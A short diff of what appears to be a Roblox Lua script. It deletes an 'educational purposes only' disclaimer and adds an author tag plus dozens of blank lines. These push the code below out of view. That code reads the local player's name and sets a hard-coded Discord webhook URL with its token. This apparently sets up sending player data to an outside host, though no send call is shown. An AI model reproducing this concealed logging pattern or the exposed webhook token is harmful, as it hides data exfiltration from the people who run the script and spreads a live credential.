@@ -1,4 +1,57 @@
---I DO NOT CONDONE THE MALICIOUS USE OF THIS SCRIPT. THIS IS PURELY FOR EDUCATIONAL PURPOSES AND SHOULD NOT BE USED IN ANY CONTEXT OTHER THAN THAT. PLEASE STAY SAFE AND BE CLEAR OF SCRIPTS THAT MAKE CONTAIN RELATED OR SIMILAR CONTENT.
+--Made by caps
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/996421381069750293/VKDvwCwWNLmzxAA1wwrqQi22Dzd62VOIFiIiTWEcrCml8LYkLHlghBQ3wuTpxfToCGkG"
 
